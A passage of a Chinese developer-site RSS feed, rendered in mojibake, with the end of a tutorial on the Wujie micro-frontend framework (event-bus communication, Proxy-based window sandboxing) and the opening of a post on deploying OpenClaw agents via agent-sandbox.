<li>æ‰€æœ‰å­åº”ç”¨å…±äº«åŒä¸€ä¸ª busï¼Œæ‰€ä»¥å­åº”ç”¨A <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>i</mi><mi>t</mi><mtext>çš„äº‹ä»¶ï¼Œå­åº”ç”¨</mtext><mi>B</mi><mtext>å¯ä»¥ç›´æ¥</mtext></mrow><annotation encoding="application/x-tex">emit çš„äº‹ä»¶ï¼Œå­åº”ç”¨B å¯ä»¥ç›´æ¥ </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mi</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">çš„äº‹ä»¶ï¼Œå­åº”ç”¨</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord cjk_fallback">å¯ä»¥ç›´æ¥</span></span></span></span></span>on æ”¶åˆ°ã€‚</li>
<li>äº‹ä»¶åå»ºè®®åŠ å‰ç¼€é¿å…å†²çªï¼Œæ¯”å¦‚ 'sub-app1-click'ã€‚</li>
<li>æ”¯æŒä¸€æ¬¡æ€§ç›‘å¬ï¼šbus.$once('event', handler)</li>
<li>é”€æ¯ç›‘å¬ï¼š$off</li>
</ul>
<p><strong>ä¼˜ç‚¹</strong>ï¼šåŒå‘ã€å®æ—¶ã€å­åº”ç”¨é—´ç›´æ¥é€šä¿¡ã€éå¸¸çµæ´» <strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦æ‰‹åŠ¨ç®¡ç†äº‹ä»¶åå’Œé”€æ¯ç›‘å¬</p>
<h5 data-id="heading-17">æ–¹æ¡ˆ3ï¼šåŸºåº§ â†’ æ‰€æœ‰å­åº”ç”¨å¹¿æ’­ï¼ˆç»“åˆ props + busï¼‰</h5>
<p>å¦‚æœä½ æƒ³åŸºåº§ä¸»åŠ¨æ¨é€æ•°æ®ç»™æ‰€æœ‰å­åº”ç”¨ï¼š</p>
<ul>
<li>ç”¨ bus.$emit å‘äº‹ä»¶ï¼Œæ‰€æœ‰å­åº”ç”¨ç›‘å¬åŒä¸€ä¸ªäº‹ä»¶ã€‚</li>
<li>æˆ–è€…ç”¨æ’ä»¶ï¼ˆè§ä¸‹é¢ï¼‰å…±äº«çŠ¶æ€ã€‚</li>
</ul>
<h5 data-id="heading-18">æ–¹æ¡ˆ4ï¼šå…±äº«çŠ¶æ€ï¼ˆæ’ä»¶æ–¹å¼ï¼Œé€‚åˆå¤æ‚çŠ¶æ€ç®¡ç†ï¼‰</h5>
<p>å¦‚æœä½ çš„é¡¹ç›®çŠ¶æ€å¾ˆå¤šï¼Œæ¨èç”¨ Wujie çš„<strong>æ’ä»¶ç³»ç»Ÿ</strong>å…±äº« Pinia/Vuex/Redux ç­‰ã€‚</p>
<p>å®˜æ–¹æ¨èä¸€ä¸ªæ’ä»¶ï¼šwujie-polyfillï¼Œå¯ä»¥å…±äº«çŠ¶æ€ç®¡ç†åº“ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼šå…±äº« Piniaï¼ˆVueï¼‰</strong> ï¼š</p>
<ol>
<li>åŸºåº§å’Œæ‰€æœ‰å­åº”ç”¨éƒ½å®‰è£…åŒä¸€ä¸ª Pinia storeã€‚</li>
<li>ç”¨æ’ä»¶è®©å®ƒä»¬å…±äº«å®ä¾‹ï¼ˆå…·ä½“ä»£ç çœ‹å®˜æ–¹æ’ä»¶æ–‡æ¡£ï¼‰ã€‚</li>
</ol>
<p>æˆ–è€…æ›´ç®€å•ï¼šç”¨ window å…±äº«ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆä¸æ¨èï¼Œå®¹æ˜“æ±¡æŸ“ï¼‰ã€‚</p>
<h5 data-id="heading-19">æ€»ç»“å¯¹æ¯”ï¼ˆå°ç™½ä¸€çœ‹å°±æ‡‚ï¼‰</h5>













































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th><th>æ–¹å‘</th><th>æ˜¯å¦å®æ—¶</th><th>ä»£ç å¤æ‚åº¦</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>åŸºåº§ â†’ å­åº”ç”¨ï¼ˆä¼ æ•°æ®/å‡½æ•°ï¼‰</td><td>props</td><td>å•å‘</td><td>æ˜¯</td><td>ä½</td><td>æœ€å¸¸ç”¨</td></tr><tr><td>å­åº”ç”¨ â†’ åŸºåº§</td><td>bus.<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>i</mi><mi>t</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">emit + </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mi</span><span class="mord mathnormal">t</span><span class="mord">+</span></span></span></span></span>on</td><td>åŒå‘</td><td>æ˜¯</td><td>ä¸­</td><td/></tr><tr><td>å­åº”ç”¨ â†’ å­åº”ç”¨</td><td>bus.<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>i</mi><mi>t</mi><mo>+</mo></mrow><annotation encoding="application/x-tex">emit + </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7429em;vertical-align:-0.0833em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mi</span><span class="mord mathnormal">t</span><span class="mord">+</span></span></span></span></span>on</td><td>åŒå‘</td><td>æ˜¯</td><td>ä¸­</td><td>ç›´æ¥é€šä¿¡ï¼Œè¶…æ–¹ä¾¿</td></tr><tr><td>å…¨å±€å…±äº«å¤æ‚çŠ¶æ€</td><td>æ’ä»¶ï¼ˆPiniaç­‰ï¼‰</td><td>åŒå‘</td><td>æ˜¯</td><td>é«˜</td><td>é¡¹ç›®å¤§æ—¶ç”¨</td></tr></tbody></table>
<h2 data-id="heading-20">wujieæºç </h2>
<p>wujieæºç ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ éƒ¨åˆ†ï¼š</p>
<ul>
<li>wujie-core</li>
<li>wujie-vue2/wujie-vue3</li>
<li>wujie-react</li>
<li>wujie-polyfill</li>
</ul>
<h3 data-id="heading-21">wujie-core</h3>
<ul>
<li>å…¥å£æ–‡ä»¶ï¼šindex.ts</li>
</ul>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å¯¼å‡ºæ ¸å¿ƒ API</span>
<span class="hljs-keyword">export</span> { startApp, preloadApp, destroyApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'./start'</span>  <span class="hljs-comment">// å¯åŠ¨ã€é¢„åŠ è½½ã€é”€æ¯</span>
<span class="hljs-keyword">export</span> { bus } <span class="hljs-keyword">from</span> <span class="hljs-string">'./bus'</span>  <span class="hljs-comment">// é€šä¿¡æ€»çº¿</span>
<span class="hljs-keyword">export</span> { <span class="hljs-title class_">Wujie</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./wujie'</span>  <span class="hljs-comment">// ä¸»ç±»</span>

<span class="hljs-comment">// å…¨å±€é…ç½®</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setupApp</span>(<span class="hljs-params">options</span>) { ... }

<span class="hljs-comment">// é¢„åŠ è½½</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">preloadApp</span>(<span class="hljs-params">options: PreloadAppOptions</span>) {
  <span class="hljs-comment">// æå‰ä¸‹è½½èµ„æºï¼Œç¼“å­˜ HTML/JS/CSS</span>
}

<span class="hljs-comment">// å¯åŠ¨åº”ç”¨</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">startApp</span>(<span class="hljs-params">options: StartAppOptions</span>) {
  <span class="hljs-comment">// åˆ›å»ºæ²™ç®±ã€åŠ è½½èµ„æºã€æ‰§è¡Œä»£ç </span>
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript">* startAppä¸»è¦æ˜¯åˆ›å»ºæ²™ç®±-ã€‹fetchèµ„æº=ã€‰æ‰§è¡Œ<span class="hljs-variable constant_">JS</span>=ã€‹æŒ‚è½½<span class="hljs-variable constant_">DOM</span>
* <span class="hljs-title class_">Wujie</span>æœ‰ä¸¤ç§æ²™ç®±æ¨¡å¼
    * é»˜è®¤ï¼š<span class="hljs-title class_">Proxy</span>æ²™ç®±ï¼ˆå¿«ï¼Œæ¨èï¼‰ï¼šwujieç”¨<span class="hljs-title class_">Proxy</span>ä»£ç†<span class="hljs-variable language_">window</span>å¯¹è±¡ï¼Œè®©å­åº”ç”¨ä»¥ä¸ºè‡ªå·±åœ¨æ“ä½œå…¨å±€<span class="hljs-variable language_">window</span>ï¼Œä½†å…¶å®æ“ä½œçš„æ˜¯â€œå‡<span class="hljs-variable language_">window</span>â€
    * iframeæ²™ç®±ï¼ˆæœ€å¼ºéš”ç¦»ï¼Œä½†æ…¢ï¼‰
    
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WujieSandbox</span> {
active = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ²™ç®±æ˜¯å¦æ¿€æ´»</span>
<span class="hljs-attr">proxyWindow</span>: <span class="hljs-title class_">WindowProxy</span>;  <span class="hljs-comment">// ä»£ç†çš„ window</span>

<span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
 <span class="hljs-comment">// åˆ›å»ºå‡ windowï¼ˆå…¶å®æ˜¯ç©ºå¯¹è±¡ï¼‰</span>
 <span class="hljs-keyword">const</span> fakeWindow = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);

 <span class="hljs-comment">// è®°å½•ä¿®æ”¹çš„å˜é‡ï¼ˆä¸ºäº†é”€æ¯æ—¶æ¢å¤ï¼‰</span>
 <span class="hljs-keyword">const</span> modifiedMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
 <span class="hljs-keyword">const</span> reversedMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();  <span class="hljs-comment">// æ¢å¤ç”¨</span>

 <span class="hljs-variable language_">this</span>.<span class="hljs-property">proxyWindow</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(fakeWindow, {
   <span class="hljs-title function_">get</span>(<span class="hljs-params">target, key</span>) {
     <span class="hljs-comment">// 1. å…ˆä»å­åº”ç”¨è‡ªå·±çš„å˜é‡æ‹¿</span>
     <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> target) <span class="hljs-keyword">return</span> target[key];
     <span class="hljs-comment">// 2. å¦åˆ™ä»çœŸå® window æ‹¿ï¼ˆåŸºåº§å…±äº«ï¼‰</span>
     <span class="hljs-keyword">return</span> <span class="hljs-variable language_">window</span>[key];
   },
   <span class="hljs-title function_">set</span>(<span class="hljs-params">target, key, value</span>) {
     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span>) {
       <span class="hljs-comment">// æ¿€æ´»æ—¶ï¼šå­åº”ç”¨ä¿®æ”¹å˜é‡ï¼Œåªæ”¹å‡ window</span>
       modifiedMap.<span class="hljs-title function_">set</span>(key, value);
       target[key] = value;
     } <span class="hljs-keyword">else</span> {
       <span class="hljs-comment">// ä¸æ¿€æ´»æ—¶ï¼šç›´æ¥æ”¹çœŸå® windowï¼ˆå…±äº«ï¼‰</span>
       <span class="hljs-variable language_">window</span>[key] = value;
     }
     <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
   },
   <span class="hljs-comment">// deleteã€has ç­‰ä¹Ÿç±»ä¼¼å¤„ç†</span>
 });

 <span class="hljs-comment">// é¿å… with è¯­å¥ï¼ˆå†å²é—®é¢˜ï¼Œå·²ä¼˜åŒ–ï¼‰</span>
 <span class="hljs-comment">// ç”¨ with åŒ…è£¹ä»£ç æ—¶ç‰¹æ®Šå¤„ç†</span>
}

<span class="hljs-comment">// é”€æ¯æ²™ç®±ï¼šæ¢å¤åŸºåº§ window</span>
<span class="hljs-title function_">destroy</span>(<span class="hljs-params"/>) {
 <span class="hljs-variable language_">this</span>.<span class="hljs-property">active</span> = <span class="hljs-literal">false</span>;
 <span class="hljs-comment">// æŠŠå­åº”ç”¨æ”¹çš„å˜é‡æ¢å¤åŸæ ·</span>
 modifiedMap.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> {
   <span class="hljs-variable language_">window</span>[key] = reversedMap.<span class="hljs-title function_">get</span>(key) || originalValue;
 });
}
}
</code></pre>
<ul>
<li>æ€ä¹ˆè§£å†³å…¨å±€å˜é‡å†²çªï¼ŸProxyæ‹¦æˆªget/setï¼Œåªè®©å­åº”ç”¨æ”¹è‡ªå·±çš„ï¼›è¿™ä¸ªæ¯”single-spaçš„snapshotå¿«ï¼Œæ¯”ä¹¾å¤çš„Proxyæ›´å®Œå–„</li>
</ul>
<h3 data-id="heading-22">æ¡†æ¶é€‚é…åŒ…</h3>
<ul>
<li>wujie-vue3ï¼ˆvueç»„ä»¶æ€ä¹ˆå®ç°çš„ï¼Ÿï¼‰å…¶å®å°±æ˜¯ä¸€ä¸ªwrapperï¼Œæ ¸å¿ƒè¿˜æ˜¯coreçš„startApp</li>
</ul>
<h2 data-id="heading-23">æ€»ç»“</h2>
<p>Wujieçš„ç›®æ ‡ï¼šè®©å­åº”ç”¨ï¼ˆVue/Reactç­‰ï¼‰åƒåµŒå…¥iframeä¸€æ ·éš”ç¦»å¼ºï¼Œæ€§èƒ½å¥½ï¼Œæ— ç™½å±
æ•´ä½“æµç¨‹ï¼š</p>
<ol>
<li>
<p>åŠ è½½å­åº”ç”¨HTMLï¼šç”¨importHTMLå‡½æ•°fetchå­åº”ç”¨çš„index.htmlï¼Œè§£æå®ƒï¼Œæå–æ‰€æœ‰çš„
</p></li>
<li>
<p>è§£æHTMLï¼šç”¨preocessTpæŠŠHTMLæ‹†æˆtemplateï¼Œscriptsï¼Œstyles</p>
</li>
<li>
<p>åˆ›å»ºæ²™ç®±ï¼šnew ä¸€ä¸ªWujieçš„ç±»å®ä¾‹ã€‚å®ƒä¼šï¼š</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªéšè—çš„iframeï¼ˆJSæ‰§è¡Œç¯å¢ƒï¼‰</li>
<li>ç”¨Shadow DOMï¼ˆå½±å­æ ¹ï¼‰éš”ç¦»CSS/DOM</li>
<li>ç”¨Proxyä»£ç†window/document/locationï¼ˆJSéš”ç¦»ï¼Œæœ€ç‰›çš„åœ°æ–¹ï¼‰</li>
<li>å¦‚æœæµè§ˆå™¨å¤ªè€ï¼Œé™çº§ç”¨çº¯iframe</li>
</ul>
</li>
<li>
<p>æ‰§è¡Œèµ„æºï¼šåŠ è½½CSSï¼ˆå†…è”æˆ–æ›¿æ¢è·¯å¾„ï¼‰ï¼Œæ‰§è¡ŒJSï¼ˆå†…è”evalæˆ–åŠ¨æ€scriptï¼‰ï¼Œæ”¯æŒæ’ä»¶ä¿®æ”¹ä»£ç ã€‚</p>
</li>
<li>
<p>æŒ‚è½½ï¼šæŠŠè§£æåçš„templateå¡åˆ°Shadow DOMæˆ–iframeï¼Œæ‰§è¡Œmountç”Ÿå‘½å‘¨æœŸã€‚</p>
</li>
<li>
<p>é€šä¿¡ï¼š å·¦å³å­åº”ç”¨å’ŒåŸºåº§å…±äº«ä¸€ä¸ªbusï¼ˆEventBusï¼‰ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>i</mi><mi>t</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">emit/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mi</span><span class="mord mathnormal">t</span><span class="mord">/</span></span></span></span></span>onå‘äº‹ä»¶ã€‚</p>
</li>
<li>
<p>ä¿æ´»/é”€æ¯ï¼šæ”¯æŒä¿æ´»æ¨¡å¼ï¼ˆä¸é”€æ¯DOMï¼‰ï¼Œé”€æ¯æ—¶æ¢å¤å˜é‡ï¼Œæ¸…é™¤äº‹ä»¶ã€‚</p>
</li>
<li>
<p>æ’ä»¶ç³»ç»Ÿï¼šæ‰€æœ‰æ­¥éª¤å¯ä»¥æ’æ’ä»¶ï¼ˆæ¯”å¦‚æ”¹CSSè·¯å¾„ï¼Œæ’é™¤JSï¼‰</p>
</li>
</ol>
<h2 data-id="heading-24">ä¸ºä»€ä¹ˆå¼º</h2>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">*</span> JSéš”ç¦»ï¼šProxyä»£ç†windowï¼Œå­åº”ç”¨æ”¹å˜é‡åªæ”¹å˜è‡ªå·±çš„â€œå‡windowâ€
<span class="hljs-bullet">*</span> CSSéš”ç¦»ï¼šShdow DOM
<span class="hljs-bullet">*</span> æ ·å¼/JSè·¯å¾„è‡ªåŠ¨ä¿®æ­£
<span class="hljs-bullet">*</span> é€šä¿¡ç®€å•ï¼šå…¨å±€Bus
<span class="hljs-bullet">*</span> æ€§èƒ½å¥½ï¼š é¢„åŠ è½½ï¼Œä¿æ´»ï¼Œæ— ç™½å±
</code></pre>
<h2 data-id="heading-25">wujie-core ä¸­æ‰€æœ‰é‡è¦å‡½æ•°/ç±»ç½—åˆ—ï¼ˆæŒ‰é‡è¦åº¦æ’åºï¼‰</h2>
<p>ä»æºç æ–‡ä»¶çœ‹ï¼Œæ ¸å¿ƒæ˜¯è¿™äº›ï¼ˆæ²¡æœ‰ä¸€ä¸ªâ€œstartAppâ€å‡½æ•°ï¼Œå¯èƒ½æ˜¯æ¡†æ¶åŒ…é‡Œè°ƒçš„ï¼Œcoreé‡Œæ˜¯åº•å±‚ï¼‰ï¼š</p>
<ol>
<li><strong>bus</strong>ï¼ˆå…¨å±€ EventBus å®ä¾‹ï¼Œindex.tsï¼‰â€”â€” é€šä¿¡æ ¸å¿ƒ</li>
<li><strong>EventBus ç±»</strong>ï¼ˆevent.tsï¼‰â€”â€” <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>n</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">on/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord">/</span></span></span></span></span>emit/$off ç­‰é€šä¿¡æ–¹æ³•</li>
<li><strong>importHTML</strong>ï¼ˆentry.tsï¼‰â€”â€” åŠ è½½å’Œè§£æå­åº”ç”¨HTMLï¼Œæœ€é‡è¦åŠ è½½å‡½æ•°</li>
<li><strong>processTpl</strong>ï¼ˆtemplate.tsï¼‰â€”â€” è§£æHTMLæå–script/style</li>
<li><strong>class Wujie</strong>ï¼ˆsandbox.tsï¼‰â€”â€” æ²™ç®±ä¸»ç±»ï¼Œconstructor/mount/destroy ç­‰</li>
<li><strong>proxyGenerator / localGenerator</strong>ï¼ˆproxy.tsï¼‰â€”â€” åˆ›å»ºProxyä»£ç† window/document/location</li>
<li><strong>getPlugins / defaultPlugin</strong>ï¼ˆplugin.tsï¼‰â€”â€” æ’ä»¶ç³»ç»Ÿ</li>
<li>å…¶ä»–è¾…åŠ©ï¼šprocessCssLoaderã€getEmbedHTML ç­‰ï¼ˆåŠ è½½CSSï¼‰</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºæ¯ä¸ªåŒäº‹éƒ¨ç½²ä¸€ä¸ª OpenClawï¼ˆClawdbot, Moltbotï¼‰ï¼Œå¿«é€Ÿä½“éªŒ OpenClawï¼ˆClawdbot, Moltbotï¼‰çš„é­…åŠ›]]></title>    <link>https://juejin.cn/post/7600787795477889070</link>    <guid>https://juejin.cn/post/7600787795477889070</guid>    <pubDate>2026-01-30T11:52:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600787795477889070" data-draft-id="7600967006893703177" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºæ¯ä¸ªåŒäº‹éƒ¨ç½²ä¸€ä¸ª OpenClawï¼ˆClawdbot, Moltbotï¼‰ï¼Œå¿«é€Ÿä½“éªŒ OpenClawï¼ˆClawdbot, Moltbotï¼‰çš„é­…åŠ›"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-30T11:52:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è€åœŸè±†è±†è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2719530120393946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºæ¯ä¸ªåŒäº‹éƒ¨ç½²ä¸€ä¸ª OpenClawï¼ˆClawdbot, Moltbotï¼‰ï¼Œå¿«é€Ÿä½“éªŒ OpenClawï¼ˆClawdbot, Moltbotï¼‰çš„é­…åŠ›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2719530120393946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è€åœŸè±†è±†è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T11:52:01.000Z" title="Fri Jan 30 2026 11:52:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åå­—å˜è¿ï¼šClawdbot -&gt; Moltbot -&gt; OpoenClaw</p>
<p>ç”¨åˆ°çš„å·¥å…·ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagent-sandbox%2Fagent-sandbox" target="_blank" title="https://github.com/agent-sandbox/agent-sandbox" ref="nofollow noopener noreferrer">github.com/agent-sandbâ€¦</a></p>
<h2 data-id="heading-0">æ•ˆæœï¼š</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78d42eabaa56414195316abb03e2a7f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770378903&amp;x-signature=swxbd0AK1dvDRUvqPAsrRg7ClNI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d2aa7d21481a43acacb40ace72461574~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ICB5Zyf6LGG6LGG6LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770378903&amp;x-signature=5MoPjM3AWLSqG6r6aoTHGoLxpXc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸€ï¼Œç”¨Agent-Sandbox ä¸­åˆ›å»ºä¸€ä¸ª OpenClaw æ²™ç®±</h2>
